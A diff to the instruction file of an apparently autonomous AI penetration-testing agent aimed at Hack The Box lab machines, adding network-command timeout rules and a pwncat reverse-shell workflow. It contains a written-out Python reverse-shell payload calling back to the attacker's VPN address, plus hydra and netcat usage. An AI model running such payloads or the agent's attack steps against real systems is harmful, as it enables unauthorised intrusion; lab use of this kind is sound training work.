@@ -120,6 +120,48 @@ Combine skills DB + web research to:
 
 ## Phase 4: Execution Protocol
 
+### MANDATORY: Command Timeouts
+
+**CRITICAL:** All network commands MUST have explicit timeouts. Commands without timeouts can hang indefinitely, blocking the entire agent.
+
+| Tool | Timeout Flag | Example |
+|------|--------------|---------|
+| curl | `--connect-timeout` + `--max-time` | `curl --connect-timeout 5 --max-time 30 http://target/` |
+| wget | `--timeout` | `wget --timeout=30 http://target/file` |
+| nc/netcat | `-w` | `nc -w 5 target 80` |
+| nmap | `--host-timeout` | `nmap --host-timeout 60s target` |
+| hydra | `-W` + `-T` | `hydra -W 5 -T 30 ...` |
+| ssh | `-o ConnectTimeout` | `ssh -o ConnectTimeout=10 user@target` |
+| smbclient | `-t` | `smbclient -t 30 //target/share` |
+
+**Default timeout values:**
+- Connection timeout: **5-10 seconds**
+- Overall operation: **30-60 seconds**
+- Large file transfers: **120 seconds max**
+
+**Examples of CORRECT usage:**
+```bash
+# Web requests
+curl --connect-timeout 5 --max-time 30 http://10.129.5.135/
+
+# File downloads
+wget --timeout=60 http://10.129.5.135/file.zip
+
+# Port checks
+nc -zv -w 3 10.129.5.135 80
+
+# SSH connections
+ssh -o ConnectTimeout=10 -o BatchMode=yes user@10.129.5.135
+```
+
+**NEVER do this:**
+```bash
+# BAD - no timeout, can hang forever
+curl http://10.129.5.135/
+wget http://10.129.5.135/largefile.zip
+nc 10.129.5.135 80
+```
+
 ### Pre-Flight Checklist
 Before executing any technique:
 
@@ -139,15 +181,29 @@ Before executing any technique:
 Use pwncat tools for shell handling:
 
 ```python
-# Start listener for reverse shell
-pwncat__listen(port=4444, timeout=60)
+# STEP 1: Get the VPN IP for reverse shell callbacks
+# CRITICAL: Always call this first - NEVER hardcode or guess the IP!
+lhost_info = pwncat__get_lhost()  # Returns {"lhost": "10.10.14.32", "interface": "tun0"}
+LHOST = lhost_info["lhost"]
 
-# Or connect to bind shell
+# STEP 2: Start listener for reverse shell
+pwncat__listen(port=4444, timeout=120)
+
+# STEP 3: Use LHOST in your payload (example for Python reverse shell)
+payload = f'''python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{LHOST}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' '''
+
+# Or connect to bind shell (target listens, we connect)
 pwncat__connect(host="10.129.x.x", port=4444)
 
 # After shell obtained
 pwncat__module(session_id="...", module="enumerate.system.uname")
 ```
+
+**IMPORTANT: Network Architecture**
+- Dame runs in a container with split-tunnel routing
+- pwncat-mcp shares gluetun's VPN network namespace
+- `pwncat__get_lhost()` returns the VPN tunnel IP (10.10.14.x) that HTB targets can reach
+- NEVER use Dame's container IP (10.89.x.x) - it's not reachable from targets!
 
 ## Phase 5: Error Handling
 
@@ -345,6 +401,7 @@ Query technique library for attack skills.
 - `$VHOST`, `$DOMAIN` - Virtual host/domain
 
 ### pwncat (Post-Exploitation)
+- `pwncat__get_lhost` - **CALL FIRST** - Get VPN IP for reverse shell callbacks
 - `pwncat__listen` - Start reverse shell listener
 - `pwncat__connect` - Connect to bind shell
 - `pwncat__sessions` - List active sessions
